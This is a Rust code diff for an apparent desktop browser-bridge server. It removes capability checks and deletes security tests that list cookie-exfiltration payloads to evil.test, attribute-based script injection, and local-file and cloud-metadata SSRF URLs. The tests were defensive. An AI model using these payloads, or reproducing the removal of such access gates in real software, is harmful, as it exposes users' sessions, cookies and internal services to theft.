-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                client
-                    .focus_element(&selector)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "focused": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector
-                }))
-            }
-
-            NativeMessage::ScrollIntoView { selector, tab_id } => {
-                let app = app_handle.ok_or_else(|| "Desktop app handle unavailable".to_string())?;
-                let (client, resolved_tab_id) =
-                    Self::get_native_cdp_client(app, tab_id, false, None).await?;
-                client
-                    .scroll_into_view(&selector)
-                    .await
-                    .map_err(|e| e.to_string())?;
-
-                Ok(json!({
-                    "scrolled": true,
-                    "tab_id": resolved_tab_id,
-                    "selector": selector
-                }))
-            }
-
             NativeMessage::Response { .. } | NativeMessage::Pong => {
                 Err("Unexpected native message type from extension".to_string())
             }
         }
-    }
-
-    async fn get_native_cdp_client(
-        app_handle: &tauri::AppHandle,
-        requested_tab_id: Option<i32>,
-        allow_create: bool,
-        initial_url: Option<&str>,
-    ) -> Result<(Arc<CdpClient>, String), String> {
-        if let Some(off) = capability_refusal(app_handle, "browser_navigate").await {
-            return Err(off);
-        }
-        let browser_state = app_handle.state::<BrowserStateWrapper>();
-        let resolved_tab_id = if let Some(tab_id) = requested_tab_id {
-            tab_id.to_string()
-        } else {
-            browser_state
-                .resolve_cdp_tab(None, allow_create, initial_url)
-                .await?
-        };
-
-        let cdp = browser_state
-            .get_cdp_client_for_tab(&resolved_tab_id)
-            .await
-            .map_err(|e| {
-                format!(
-                    "Failed to connect to browser tab {}: {}",
-                    resolved_tab_id, e
-                )
-            })?;
-
-        Ok((cdp, resolved_tab_id))
     }
 }
 
@@ -2557,7 +1624,7 @@ mod tests {
         let branch = source
             .split("NativeMessage::SelectedTextQuery")
             .nth(1)
-            .and_then(|tail| tail.split("NativeMessage::ExecuteScript").next())
+            .and_then(|tail| tail.split("NativeMessage::Response").next())
             .expect("selected-context receiver branch must exist");
 
         assert!(!branch.contains("extension::LATEST_PAGE_CONTEXT"));
@@ -2621,7 +1688,6 @@ mod tests {
                 user_id: Some("vscode-extension".to_string()),
                 team_id: None,
                 current_resource: None,
-                capabilities: ExtensionCapabilities::none(),
             },
         );
 
@@ -2974,7 +2040,7 @@ mod tests {
         );
     }
 
-    // ── SEC-11 handshake: Desktop-displayed, user-confirmed code ─────────────
+    // ── Pairing handshake: Desktop-displayed, user-confirmed code ─────────────
 
     #[tokio::test]
     async fn pair_request_hands_back_only_an_opaque_request_id() {
@@ -3386,12 +2452,7 @@ mod tests {
 
     #[tokio::test]
     async fn test_execute_native_message_ping() {
-        let result = RealtimeServer::execute_native_message(
-            json!({ "type": "ping" }),
-            None,
-            &ExtensionCapabilities::none(),
-        )
-        .await;
+        let result = RealtimeServer::execute_native_message(json!({ "type": "ping" }), None).await;
 
         assert!(result.is_ok());
         assert_eq!(result.unwrap(), json!({ "pong": true }));
@@ -3405,7 +2466,6 @@ mod tests {
         let result = RealtimeServer::execute_native_message(
             json!({ "type": "connect", "extension_id": ext_id }),
             None,
-            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3420,7 +2480,6 @@ mod tests {
         let result = RealtimeServer::execute_native_message(
             json!({ "type": "connect", "extension_id": "ext_123" }),
             None,
-            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3432,7 +2491,6 @@ mod tests {
         let result = RealtimeServer::execute_native_message(
             json!({ "type": "disconnect", "reason": "test_disconnect" }),
             None,
-            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3447,7 +2505,6 @@ mod tests {
         let result = RealtimeServer::execute_native_message(
             json!({ "type": "unknown_type" }),
             None,
-            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3471,7 +2528,6 @@ mod tests {
                 "timestamp": 1
             }),
             None,
-            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3496,7 +2552,6 @@ mod tests {
                 "duration": 12
             }),
             None,
-            &ExtensionCapabilities::none(),
         )
         .await;
 
@@ -3512,411 +2567,6 @@ mod tests {
     // Presenting the bridge token used to grant every native message. These pin
     // the refusal so a token-holding peer cannot run JavaScript in the user's
     // signed-in tabs or read their cookies and local storage.
-
-    fn privileged_native_payloads() -> Vec<(Value, &'static str)> {
-        vec![
-            (
-                json!({ "type": "execute_script", "script": "fetch('https://evil.test')" }),
-                "script execution",
-            ),
-            (
-                json!({ "type": "get_cookies", "url": "https://example.com" }),
-                "cookie access",
-            ),
-            (
-                json!({
-                    "type": "set_cookie",
-                    "cookie": {
-                        "name": "session",
-                        "value": "stolen",
-                        "domain": null,
-                        "path": null,
-                        "secure": null,
-                        "http_only": null,
-                        "expires": null
-                    }
-                }),
-                "cookie access",
-            ),
-            (
-                json!({ "type": "get_local_storage", "key": null, "tab_id": null }),
-                "local storage access",
-            ),
-            (
-                json!({ "type": "set_local_storage", "key": "k", "value": "v", "tab_id": null }),
-                "local storage access",
-            ),
-            (
-                json!({
-                    "type": "set_attribute",
-                    "selector": "body",
-                    "attribute": "onmouseover",
-                    "value": "fetch('https://evil.test/x?c='+document.cookie)",
-                    "tab_id": null
-                }),
-                "script execution",
-            ),
-        ]
-    }
-
-    #[tokio::test]
-    async fn privileged_native_messages_are_refused_without_a_negotiated_capability() {
-        for (payload, capability) in privileged_native_payloads() {
-            let error = RealtimeServer::execute_native_message(
-                payload.clone(),
-                None,
-                &ExtensionCapabilities::none(),
-            )
-            .await
-            .expect_err(&format!("{payload} ran without a capability check"));
-
-            assert!(
-                error.contains(capability),
-                "expected a {capability} refusal for {payload}, got: {error}"
-            );
-            assert!(
-                !error.contains("Desktop app handle"),
-                "{payload} reached the browser sink before the capability check: {error}"
-            );
-        }
-    }
-
-    #[tokio::test]
-    async fn a_privileged_message_runs_once_its_capability_is_granted() {
-        let mut granted = ExtensionCapabilities::none();
-        granted.supports_cookies = true;
-
-        let error = RealtimeServer::execute_native_message(
-            json!({ "type": "get_cookies", "url": "https://example.com" }),
-            None,
-            &granted,
-        )
-        .await
-        .expect_err("no app handle is available in unit tests");
-
-        assert!(
-            error.contains("Desktop app handle"),
-            "a granted capability must reach the handler, got: {error}"
-        );
-    }
-
-    #[test]
-    fn a_peer_cannot_negotiate_itself_script_cookie_or_storage_access() {
-        let negotiated = RealtimeServer::negotiated_capabilities(&json!({
-            "type": "connect",
-            "extension_id": "abcdefghijklmnopabcdefghijklmnop",
-            "capabilities": {
-                "version": "9.9.9",
-                "supports_accessibility_tree": true,
-                "supports_screenshot": true,
-                "supports_cookies": true,
-                "supports_local_storage": true,
-                "supports_form_fill": true,
-                "supports_script_execution": true
-            }
-        }));
-
-        assert!(!negotiated.grants(NativeCapability::ScriptExecution));
-        assert!(!negotiated.grants(NativeCapability::Cookies));
-        assert!(!negotiated.grants(NativeCapability::LocalStorage));
-        assert!(negotiated.supports_accessibility_tree);
-        assert!(negotiated.supports_screenshot);
-        assert!(negotiated.supports_form_fill);
-    }
-
-    #[test]
-    fn a_connect_payload_negotiates_only_the_flags_it_declares() {
-        let partial = RealtimeServer::negotiated_capabilities(&json!({
-            "type": "connect",
-            "capabilities": { "supports_screenshot": true }
-        }));
-        assert!(partial.supports_screenshot);
-        assert!(!partial.supports_accessibility_tree);
-        assert!(!partial.supports_form_fill);
-
-        let absent = RealtimeServer::negotiated_capabilities(&json!({ "type": "connect" }));
-        assert!(!absent.supports_screenshot);
-        assert!(!absent.supports_accessibility_tree);
-        assert!(!absent.supports_form_fill);
-    }
-
-    #[tokio::test]
-    async fn set_attribute_cannot_smuggle_script_execution_past_the_capability_gate() {
-        // The gate used to name ExecuteScript alone, so this pair ran arbitrary
-        // JavaScript in the signed-in tab with no capability at all: the first
-        // message writes an inline handler through el.setAttribute, the second
-        // dispatches the mouseover that fires it.
-        let injection = json!({
-            "type": "set_attribute",
-            "selector": "body",
-            "attribute": "onmouseover",
-            "value": "fetch('https://evil.test/x?c='+encodeURIComponent(document.cookie))",
-            "tab_id": null
-        });
-
-        let error =
-            RealtimeServer::execute_native_message(injection, None, &ExtensionCapabilities::none())
-                .await
-                .expect_err("set_attribute ran without a capability check");
-
-        assert!(
-            error.contains("script execution"),
-            "expected a script-execution refusal, got: {error}"
-        );
-        assert!(
-            !error.contains("Desktop app handle"),
-            "set_attribute reached the browser sink before the capability check: {error}"
-        );
-    }
-
-    #[test]
-    fn every_sink_that_writes_an_attribute_or_a_script_needs_the_script_grant() {
-        for message in [
-            NativeMessage::ExecuteScript {
-                script: "1".to_string(),
-                tab_id: None,
-            },
-            NativeMessage::SetAttribute {
-                selector: "form".to_string(),
-                attribute: "action".to_string(),
-                value: "https://evil.test/collect".to_string(),
-                tab_id: None,
-            },
-        ] {
-            assert_eq!(
-                NativeCapability::required_for(&message),
-                Some(NativeCapability::ScriptExecution)
-            );
-        }
-    }
-
-    fn script_execution_granted() -> ExtensionCapabilities {
-        ExtensionCapabilities {
-            supports_script_execution: true,
-            ..ExtensionCapabilities::none()
-        }
-    }
-
-    /// CLAUDE-SECURITY F2: the grant says the peer may run *a* script; it never
-    /// said which one. The body reached `client.evaluate` unread, so the
-    /// content screen the AGI and IPC paths run was a property of those callers
-    /// rather than of the sink. The screen runs before the app handle is
-    /// resolved, so "Desktop app handle unavailable" means the body got past it.
-    #[tokio::test]
-    async fn a_peer_holding_the_script_grant_still_cannot_exfiltrate_the_session() {
-        for script in [
-            "fetch('https://evil.test/x',{method:'POST',body:document.cookie})",
-            "const o={};o.l=location;o.l.host='evil.test'",
-        ] {
-            let error = RealtimeServer::execute_native_message(
-                json!({ "type": "execute_script", "script": script, "tab_id": null }),
-                None,
-                &script_execution_granted(),
-            )
-            .await
-            .expect_err("an unscreened script body reached the page");
-            assert!(
-                error.starts_with("Blocked browser script:"),
-                "expected the content screen to refuse {script}, got: {error}"
-            );
-        }
-
-        let allowed = RealtimeServer::execute_native_message(
-            json!({ "type": "execute_script", "script": "return document.title", "tab_id": null }),
-            None,
-            &script_execution_granted(),
-        )
-        .await
-        .expect_err("no app handle is available in tests");
-        assert!(
-            allowed.contains("Desktop app handle"),
-            "a plain DOM read must still reach the browser: {allowed}"
-        );
-    }
-
-    /// An attribute write is script execution spelled without the word:
-    /// `onmouseover` runs on the next hover, and a URL attribute submits or
-    /// loads off origin.
-    #[tokio::test]
-    async fn a_peer_may_not_write_an_event_handler_or_a_url_attribute() {
-        for (attribute, value) in [
-            (
-                "onmouseover",
-                "fetch('https://evil.test/x?c='+document.cookie)",
-            ),
-            ("href", "https://evil.test/collect"),
-            ("action", "https://evil.test/collect"),
-            ("style", "background:url(https://evil.test/x)"),
-            ("data-note", "https://evil.test/collect"),
-        ] {
-            let error = RealtimeServer::execute_native_message(
-                json!({
-                    "type": "set_attribute",
-                    "selector": "body",
-                    "attribute": attribute,
-                    "value": value,
-                    "tab_id": null
-                }),
-                None,
-                &script_execution_granted(),
-            )
-            .await
-            .expect_err("an unscreened attribute write reached the page");
-            assert!(
-                error.starts_with("Blocked attribute write:"),
-                "expected the attribute screen to refuse {attribute}, got: {error}"
-            );
-        }
-
-        let allowed = RealtimeServer::execute_native_message(
-            json!({
-                "type": "set_attribute",
-                "selector": "input[name=first]",
-                "attribute": "value",
-                "value": "Ada",
-                "tab_id": null
-            }),
-            None,
-            &script_execution_granted(),
-        )
-        .await
-        .expect_err("no app handle is available in tests");
-        assert!(
-            allowed.contains("Desktop app handle"),
-            "filling a form field must still reach the browser: {allowed}"
-        );
-    }
-
-    // ── F23: where a bridge peer may drive the browser ──────────────────────
-    //
-    // Navigate used to hand `url` straight to Page.navigate, so the peer could
-    // open a local file or an internal service and read it back. The guard runs
-    // before the app handle is resolved, so "Desktop app handle unavailable"
-    // means the message got past it.
-
-    async fn native_message_error(payload: Value) -> String {
-        RealtimeServer::execute_native_message(
-            payload.clone(),
-            None,
-            &ExtensionCapabilities::none(),
-        )
-        .await
-        .expect_err(&format!("{payload} was not refused"))
-    }
-
-    #[tokio::test]
-    async fn navigate_refuses_local_files_and_internal_destinations() {
-        for url in [
-            "file:///etc/passwd",
-            "file:///Users/victim/.ssh/id_rsa",
-            "data:text/html,<script>fetch('https://evil.test')</script>",
-            "javascript:alert(document.cookie)",
-            "chrome://settings",
-            "http://127.0.0.1:8080/admin",
-            "http://localhost:3000/",
-            "https://api.localhost/",
-            "http://[::1]:9229/json",
-            "http://10.1.2.3/",
-            "http://192.168.1.1/",
-            "http://172.16.0.9/",
-            "http://169.254.169.254/latest/meta-data/",
-            "http://[::ffff:169.254.169.254]/",
-            "http://100.64.0.1/",
-            "http://0.0.0.0/",
-            "http://2130706433/",
-            "http://127.1/",
-        ] {
-            let error = native_message_error(json!({ "type": "navigate", "url": url })).await;
-            assert!(
-                !error.contains("Desktop app handle"),
-                "{url} reached the browser: {error}"
-            );
-
-            let error = native_message_error(json!({ "type": "create_tab", "url": url })).await;
-            assert!(
-                !error.contains("Desktop app handle"),
-                "{url} reached tab creation: {error}"
-            );
-        }
-    }
-
-    #[tokio::test]
-    async fn navigate_refuses_a_host_whose_address_cannot_be_checked() {
-        let error = native_message_error(
-            json!({ "type": "navigate", "url": "https://never-resolves.invalid/" }),
-        )
-        .await;
-
-        assert!(
-            error.contains("did not resolve"),
-            "an unresolvable host must fail closed, got: {error}"
-        );
-    }
-
-    #[tokio::test]
-    async fn navigate_still_reaches_the_browser_for_a_public_destination() {
-        let error =
-            native_message_error(json!({ "type": "navigate", "url": "http://93.184.216.34/" }))
-                .await;
-
-        assert!(
-            error.contains("Desktop app handle"),
-            "a public destination must pass the guard, got: {error}"
-        );
-    }
-
-    #[test]
-    fn page_reads_are_refused_when_the_tab_landed_on_an_internal_document() {
-        // A redirect the guard never saw is the way an internal service still
-        // ends up in the tab, so the live document is what decides the read.
-        for url in [
-            "http://169.254.169.254/latest/meta-data/",
-            "http://127.0.0.1:3000/admin",
-            "http://localhost:8080/",
-            "http://192.168.0.1/",
-            "http://[::1]/",
-            "file:///etc/passwd",
-        ] {
-            assert!(
-                RealtimeServer::ensure_document_readable(url).is_err(),
-                "expected a read of {url} to be refused"
-            );
-        }
-    }
-
-    #[test]
-    fn page_reads_still_work_on_an_ordinary_document() {
-        for url in [
-            "https://example.com/docs",
-            "http://93.184.216.34/",
-            "about:blank",
-            "",
-        ] {
-            assert!(
-                RealtimeServer::ensure_document_readable(url).is_ok(),
-                "expected a read of {url} to be allowed"
-            );
-        }
-    }
-
-    #[test]
-    fn an_authenticated_connection_starts_with_no_capabilities() {
-        let client = WebSocketClient {
-            id: "client-1".to_string(),
-            user_id: Some("vscode-extension".to_string()),
-            team_id: None,
-            current_resource: None,
-            capabilities: ExtensionCapabilities::none(),
-        };
-
-        for capability in [
-            NativeCapability::ScriptExecution,
-            NativeCapability::Cookies,
-            NativeCapability::LocalStorage,
-        ] {
-            assert!(!client.capabilities.grants(capability));
-        }
-    }
 
     // ── B3 fix: Origin allowlist tests ──────────────────────────────────────
     //
